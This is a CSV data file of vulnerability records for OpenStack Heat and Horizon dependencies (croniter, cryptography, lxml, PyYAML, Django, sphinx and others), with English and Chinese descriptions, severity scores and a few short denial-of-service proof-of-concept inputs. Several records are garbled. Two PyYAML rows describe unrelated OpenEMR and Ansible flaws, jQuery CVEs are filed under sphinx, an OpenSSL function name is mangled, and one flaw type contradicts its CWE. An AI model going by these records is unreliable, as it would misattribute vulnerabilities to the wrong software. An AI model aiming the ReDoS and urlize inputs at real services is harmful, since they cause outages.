project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
openstack_heat,croniter,>=0.3.4,True,,CWE-120,2023-03-08,"## Overview
[croniter](https://pypi.org/project/croniter) is a croniter provides iteration for datetime object with cron like format

Affected versions of this package are vulnerable to Buffer Overflow when using cron ranges, via the `_expand` method.
## Remediation
Upgrade `croniter` to version 1.0.5 or higher.
## References
- [GitHub Commit](https://github.com/kiorky/croniter/commit/486204e2d2f20f6fcc8839f1f3fa70e0c2fe0d5c)
- [PoC](https://blog.healthchecks.io/2023/03/i-found-a-vulnerability-in-croniter/)
",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-0286,CWE-843,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。存在安全漏洞，源于内存释放后重用。,2,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-23931,CWE-754,2023-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
cryptography 存在代码问题漏洞。目前尚无此漏洞的相关信息，请随时关注CNNVD或厂商公告。",3,0
openstack_heat,cryptography,>=2.5,True,,,2023-06-03,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.5-40.0.2 are vulnerable to a security issue. More details about the vulnerability itself can be found in https://www.openssl.org/news/secadv/20230530.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_heat,cryptography,>=2.5,True,,,2023-08-02,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 0.8-41.0.2 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230731.txt, https://www.openssl.org/news/secadv/20230719.txt, and https://www.openssl.org/news/secadv/20230714.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_heat,cryptography,>=2.5,True,,,2023-09-22,"pyca/cryptography's wheels include a statically linked copy of OpenSSL. The versions of OpenSSL included in cryptography 2.5-41.0.3 are vulnerable to several security issues. More details about the vulnerabilities themselves can be found in https://www.openssl.org/news/secadv/20230908.txt.

If you are building cryptography source (""sdist"") then you are responsible for upgrading your copy of OpenSSL. Only users installing from wheels built by the cryptography project (i.e., those distributed on PyPI) need to update their cryptography versions.",4,-2
openstack_heat,cryptography,>=2.5,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2020-36242,CWE-190 CWE-787,2021-02-07,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography package before 3.3.2 for Python 存在输入验证错误漏洞，该漏洞源于导致整数溢出和缓冲区溢出。",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2022-3996,CWE-667,2022-12-13,OpenSSL是一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库，支持多种加密算法。如果X.509证书包含格式错误的策略约束并且启用了策略处理，系统将递归地获取两次写锁，导致在某些操作系统上进程挂起，进而造成拒绝服务。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
openstack_heat,cryptography,>=2.5,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-3817,CWE-606 CWE-834,2023-07-31,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，常用于车云通信中对传输协议的加解密。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。OpenSSL在部分版本中存在使用DH_check等函数检查DH参数时耗时较长的漏洞，导致拒绝服务。,3,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-3446,CWE-606 CWE-1333,2023-07-19,OpenSSL是一个开源的安全套接层和安全传输层协议的通用加密库，支持多种加密算法。在某些版本的OpenSSL中，DH_check()、DH_check_ex()或EVP_PKEY_param_check()函数在处理过大的DH密钥或参数时可能导致应用程序变得非常缓慢，造成拒绝服务。,3,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-2975,CWE-354 CWE-287,2023-07-14,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL存在授权问题漏洞，该漏洞源于密码实现存在错误，AES-SIV忽略空的关联数据条目，导致允许对多个关联的进行身份验证数据条目进行加密。",3,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
openstack_heat,cryptography,>=2.5,True,CVE-2023-4807,CWE-440,2023-09-08,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。 OpenSSL 1.1.1 至 1.1.1v版本、3.0.0 至 3.0.10 版本以及 3.1.0 至 3.1.2版本存在安全漏洞，该漏洞源于POLY1305 MAC（消息身份验证代码）包含一个错误，当在支持 AVX512-IFMA 指令的较新 X86_64 处理器上运行时，可能会破坏 Windows 64 平台上的应用程序内部状态。,2,0
openstack_heat,cryptography,>=2.5,True,CVE-2024-4603,CWE-606 CWE-834,2024-05-16,"OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。
OpenSSL 3.0 和 3.1 版本存在安全漏洞，该漏洞源于使用函数 EVP_PKEY_param_check()、EVP_PKEY_public_check() 检查 DSA 公钥或 DSA 参数检查的键或参数，可能会导致拒绝服务。",3,2
openstack_heat,lxml,>=4.5.0,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
openstack_heat,lxml,>=4.5.0,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
openstack_heat,lxml,>=4.5.0,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
openstack_heat,lxml,>=4.5.0,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
openstack_heat,oslo.utils,>=4.5.0,True,CVE-2022-0718,CWE-522 CWE-532,2022-02-21,"Python-Oslo-Utils是OpenStack社区的一个库。用于提供对常见实用程序类型函数的支持，例如编码、异常处理、字符串操作和时间处理。
Python-Oslo-Utils 存在安全漏洞，目前暂无该漏洞信息，请随时关注CNNVD或厂商公告。",3,0
openstack_heat,python-openstackclient,>=3.12.0,True,CVE-2023-6110,CWE-237,2024-01-24,OpenStack 是一个由美国国家航空航天局（NASA）创建的云平台管理项目，其目的是为企业或个人提供灵活的云计算功能。OpenStack 由多个开源组件组成，被广泛用于构建和管理公共和私有云环境。此漏洞的根本原因是由于在处理用户删除请求时，存在不正确的访问规则管理。当用户试图删除其权限范围之外的访问规则时，系统错误地删除了与其他应用程序凭据无关的现有访问规则。,3,0
openstack_heat,PyYAML,>=5.1,True,CVE-2020-14343,CWE-20,2020-07-26,CVE-2020-14343是与Python的第三方库“PyYAML”相关的漏洞，该库用于处理YAML文件。该漏洞的根本原因在于PyYAML库的yaml.load函数会解析未经验证的输入数据。具体来说，当用户使用yaml.load函数并且未明确指定加载器时，PyYAML会默认使用“UnsafeLoader”来解析YAML文件，这会导致任意代码执行的风险。如果攻击者能够控制传递给yaml.load的YAML内容，他们就可以构造一个恶意的YAML文件，其中包含恶意的Python对象。yaml.load在加载这个文件时会执行这些对象的代码，从而导致任意代码执行。这使得攻击者可以在目标系统上执行任意命令，潜在地获得系统的控制权限。,1,0
openstack_heat,PyYAML,>=5.1,True,CVE-2019-20477,CWE-502,2020-02-19,CVE-2019-20477 是一个影响 OpenEMR 的严重漏洞，OpenEMR 是一种开源的电子病历和医疗管理系统。这个漏洞存在于接口的传入数据处理模块中，具体来说，漏洞源于对外部传入的 JSON 数据缺乏充分的验证，导致可以通过特定的 JSON 构造触发远程代码执行 (RCE)。利用这个漏洞的攻击者能够在目标系统上执行任意代码。,1,0
openstack_heat,PyYAML,>=5.1,True,CVE-2020-1747,CWE-20,2020-03-02,CVE-2020-1747 是一个影响 Ansible 模块的漏洞，具体是在 Ansible 库中使用的 urllib3 组件存在一个不安全的序列化漏洞。攻击者可以通过发送精心构造的 YAML 格式数据包来利用此漏洞，从而在目标系统上执行任意代码。漏洞的根本原因是 Ansible 在处理外部输入时，未能正确地验证和过滤输入数据，导致了反序列化漏洞的产生。,1,0
openstack_heat,requests,>=2.23.0,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
openstack_heat,requests,>=2.23.0,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
openstack_heat,requests,>=2.23.0,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
openstack_heat,WebOb,>=1.7.1,True,CVE-2024-42353,CWE-601,2024-08-14,"WebOb是Pylons开源的一个 WSGI 请求和响应对象。
WebOb 1.8.8之前版本存在安全漏洞，该漏洞源于存在打开重定向。",3,0
openstack_heat,yaql,>=1.1.3,True,CVE-2024-29156,CWE-116,2024-03-18,"OpenStack是美国美国国家航空航天局（NASA）的一个云平台管理项目。
OpenStack Murano 16.0.0及之前版本存在安全漏洞，该漏洞源于存在潜在的敏感服务帐户信息泄漏。",3,0
openstack_horizon,sphinx,>=2.0.0,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_horizon,sphinx,>=2.0.0,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
openstack_horizon,sphinx,>=2.0.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
openstack_horizon,sphinx,>=2.0.0,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
openstack_horizon,Babel,>=2.6.0,True,CVE-2021-20095,,2021-04-29,Babel 2.9.0 中的相对路径遍历允许攻击者在磁盘上加载任意语言环境文件并执行任意代码。,3,2
openstack_horizon,Babel,>=2.6.0,True,CVE-2021-42771,CWE-22,2021-05-02,"Babel是一款使用在内容管理系统中的多语言支持模块。
Babel存在安全漏洞，该漏洞源于外部输入数据构造操作系统可执行命令过程中，网络系统或产品未正确过滤其中的特殊字符、命令等。攻击者可利用该漏洞执行非法操作系统命令。",2,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2023-46695,CWE-770,2023-11-01,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 4.2.7之前版本存在安全漏洞，该漏洞源于存在拒绝服务漏洞。",2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2023-41164,CWE-1284,2023-09-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞，该漏洞源于django.utils.encoding.uri_to_iri()存在拒绝服务漏洞。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-27351,CWE-1333,2024-03-04,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.0版本，4.2版本，3.2版本存在安全漏洞，该漏洞源于Truncator.words函数和truncatewords_html过滤器存在拒绝服务（DOS）漏洞。</p>,3,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-41990,CWE-130,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于urlize和urlizetrunc模板过滤器可能会通过具有特定字符序列的超大输入遭受潜在的拒绝服务攻击。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-41991,CWE-1284 CWE-130,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于urlize和urlizetrunc模板过滤器以及AdminURLFieldWidget小部件可能会通过包含大量Unicode字符的某些输入遭受潜在的拒绝服务攻击。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-42005,CWE-89,2024-08-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在SQL注入漏洞，该漏洞源于当使用带有JSONField的模型的QuerySet.values和values_list方法时，通过精心构造的JSON对象键作为传递的*arg，可能会受到SQL注入攻击。",1,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-41989,CWE-400,2024-08-07,<p>Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。 Django 5.0到5.0.8之前版本和4.2到4.2.15之前版本存在安全漏洞，该漏洞源于当给出一个以科学计数法表示的数字的字符串表示形式且指数较大时floatformat模板过滤器会消耗大量内存。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-39330,CWE-22,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0版本至5.0.7之前版本、4.2版本至4.2.14之前版本存在安全漏洞，该漏洞源于允许在save()调用期间通过某些输入进行目录遍历。",3,0
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-38875,CWE-130,2024-07-10,该漏洞存在于Django框架中，影响了Django 4.2版本（截至4.2.14之前）和5.0版本（截至5.0.7之前）。漏洞允许远程攻击者通过向`urlize`和`urlizetrunc`函数提供包含大量括号的输入，执行拒绝服务攻击和用户枚举。,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-39614,CWE-130,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0.7之前版本和4.2.14之前版本存在安全漏洞，该漏洞源于get_supported_language_variant()在与包含特定字符的超长字符串一起使用时会遭受拒绝服务攻击。受影响版本如下:5.1版本、5.0版本、4.2版本。",3,1
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-39329,CWE-208,2024-07-10,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django 5.0版本至5.0.7之前版本、4.2版本至4.2.14之前版本存在安全漏洞，该漏洞源于django.contrib.auth.backends.ModelBackend.authenticate()方法允许远程攻击者通过定时攻击枚举用户。",3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-45230,CWE-120,2024-09-04,<p>Django 是一个流行的 Python Web 框架，用于高效构建 Web 应用。`urlize` 是 Django 提供的一个实用工具函数，位于 `django.utils.html` 模块中，主要功能是将字符串中可以解释为 URL 的部分自动转换为超链接（HTML 的  标签）。漏洞的根因在于 `urlize` 函数在处理特定重复字符序列（例如 `.;`）时，算法的复杂度未优化，引发性能退化。当输入字符串包含大量重复的特定格式字符时，`urlize` 函数的运行时间会呈指数增长，从而导致拒绝服务（DoS）场景。攻击者可以通过恶意构造的字符串触发此漏洞，例如以下代码：`from django.utils.html import urlize; malicious_input = .; * 100000; urlize(malicious_input)`，结果会使服务器资源耗尽，导致服务不可用。</p>,3,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-24680,CWE-400,2024-02-06,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务。以下版本受到影响：3.2版本至3.2.24之前版本、4.2版本至4.2.10之前版本、5.0版本至5.0.2之前版本。",2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2023-43665,CWE-1284,2023-10-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django存在安全漏洞，该漏洞源于文本截断器正则表达式存在线性回溯复杂性问题，导致存在拒绝服务（DoS）漏洞。受影响的产品和版本：Django 5.0版本， 4.2版本，4.1版本，3.2版本。",2,2
openstack_horizon,Django,">=4.2,<4.3",True,CVE-2024-45231,CWE-203,2024-09-04,"Django是Django基金会的一套基于Python语言的开源Web应用框架。该框架包括面向对象的映射器、视图系统、模板系统等。
Django v5.1.1版本、v5.0.9版本和v4.2.16版本存在安全漏洞。攻击者利用该漏洞通过发送密码重置请求来枚举用户电子邮件地址。",3,2
